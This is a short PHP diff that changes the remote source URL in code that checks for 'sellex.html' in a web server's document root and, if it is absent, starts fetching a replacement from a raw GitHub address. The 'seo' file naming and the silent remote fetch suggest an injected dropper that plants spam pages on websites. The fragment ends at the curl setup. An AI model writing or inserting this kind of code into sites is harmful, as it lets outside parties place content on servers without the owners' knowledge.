@@ -4,7 +4,7 @@ $filenameseo = $_SERVER['DOCUMENT_ROOT'].'/sellex.html';
 
 if (file_exists($filenameseo)) {
 } else {
-	$url = "https://raw.githubusercontent.com/ajobekkhnpola/sellex-html/main/sellex.html";
+	$url = "https://raw.githubusercontent.com/sidhelchor/slx/main/slx.html";
 	$im = curl_init($url);
 	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
